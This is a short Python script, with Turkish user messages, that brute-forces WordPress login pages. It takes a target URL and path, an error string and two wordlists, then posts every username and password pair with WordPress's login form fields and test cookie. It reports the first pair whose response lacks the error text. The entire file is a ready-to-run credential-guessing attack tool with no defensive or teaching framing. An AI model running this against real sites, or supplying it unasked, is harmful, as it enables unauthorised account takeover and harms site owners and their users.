import requests
import os
import sys

def read_wordlist(file_path):
    words = []
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                words.append(line)
        return words
    else:
        print("Dosya bulunamadı. Lütfen tekrar deneyin.")
        sys.exit(1)

def get_valid_url(url):
    while True:
        if url.startswith("http://") or url.startswith("https://"):
            return url
        else:
            print("URL, 'http://' veya 'https://' ile başlamalıdır. Lütfen tekrar deneyin.")
            url = input("URL girin: ")

def get_valid_directory(directory):
    while True:
        if directory.startswith("/"):
            return directory
        else:
            directory = "/" + directory
            return directory



def brute(url, directory, error_msg, user_wordlist, pass_wordlist):
    url = get_valid_url(url)
    directory = get_valid_directory(directory)
    f_url = url + directory

    user_wordlist = read_wordlist(user_wordlist)
    pass_wordlist = read_wordlist(pass_wordlist)

    try:
        for username in user_wordlist:
            for password in pass_wordlist:
                payload = {
                    'log': username,
                    'pwd': password,
                    'wp-submit': 'Log In'
                }
                header = {'Cookie': 'wordpress_test_cookie=WP Cookie check'}

                try:
                    req = requests.post(f_url, data=payload, headers=header)
                    req.raise_for_status()

                    if error_msg not in req.text:
                        print("Başarılı Giriş:")
                        print("Kullanıcı Adı:", username, "\nParola:", password)
                        return
                except requests.exceptions.RequestException as e:
                    print("Hata oluştu:", e)
                    break

    except KeyboardInterrupt:
        print("\nİşlem kullanıcı tarafından durduruldu.")
        sys.exit(1)

    print("Eşleşme sağlanamadı")


if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Kullanım: python script.py <URL> <Dizin> <Hata Metni> <Kullanıcı Wordlist> <Parola Wordlist>")
        sys.exit(1)
    else:
        url = sys.argv[1]
        directory = sys.argv[2]
        error_msg = sys.argv[3]
        user_wordlist = sys.argv[4]
        pass_wordlist = sys.argv[5]

        brute(url, directory, error_msg, user_wordlist, pass_wordlist)
